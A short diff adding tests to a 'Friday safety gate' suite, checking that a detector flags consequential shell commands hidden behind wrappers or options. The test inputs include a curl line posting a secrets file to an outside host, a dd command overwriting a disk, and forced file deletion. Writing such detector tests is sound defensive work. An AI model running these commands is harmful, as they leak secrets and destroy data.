@@ -11,4 +11,15 @@ describe('Friday safety gate', () => {
     'allows ordinary work for %s',
     (command) => expect(isConsequentialCommand(command)).toBe(false),
   );
+
+  it.each([
+    'command /bin/rm -f old-file',
+    'git -C ./repo push origin main',
+    'npm --prefix ./package publish',
+    'curl https://example.com --data @secrets.txt',
+    'find . -name "*.tmp" -delete',
+    'dd if=image.iso of=/dev/sda',
+  ])('still catches common wrapper/option bypasses in %s', (command) => {
+    expect(isConsequentialCommand(command)).toBe(true);
+  });
 });
